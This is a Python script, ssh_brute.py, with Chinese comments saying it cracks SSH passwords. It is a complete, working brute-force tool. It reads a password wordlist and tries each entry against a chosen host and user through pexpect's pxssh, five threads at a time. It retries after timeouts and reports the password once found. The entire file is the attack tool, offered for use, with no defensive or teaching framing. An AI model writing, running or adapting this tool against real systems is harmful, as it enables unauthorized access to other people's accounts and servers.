#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019-05-07 2:05
# @Author  : Zhang Bin
# @Site    : 
# @File    : ssh_brute.py
# @Software: PyCharm

# 破解ssh密码

from pexpect import pxssh
import optparse
import time
import threading
# 最大连接数
max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)
found = False
fails = 0

def connect(host, user, password, release):
    global found
    global fails
    try:
        con = pxssh.pxssh()
        con.login(host, user, password)
        print('[+] Password found: ' + password)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parse = optparse.OptionParser('usage: prog -H <target host> '
                                  '-u <user> -F <password list>')
    parse.add_option('-H', dest='tgthost', type='string',
                     help='specify target host')
    parse.add_option('-u', dest='user', type='string',
                     help='specify the user')
    parse.add_option('-F', dest='password_file', type='string',
                     help='specify password file')
    (options, args) = parse.parse_args()
    host = options.tgthost
    password_file = options.password_file
    user = options.user
    if host == None or password_file == None or user == None:
        print(parse.usage)
        exit(0)
    with open(password_file, 'r') as f:
        for line in f.readlines():
            if found:
                print('[*] Exiting: Password found')
                exit(0)
            if fails > 5:
                print('[!] Exiting: too many socket timeouts')
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print('[-] Testing: ' + str(password))
            t = threading.Thread(target=connect, args=(host, user, password, True))
            child = t.start()
if __name__ == '__main__':
    main()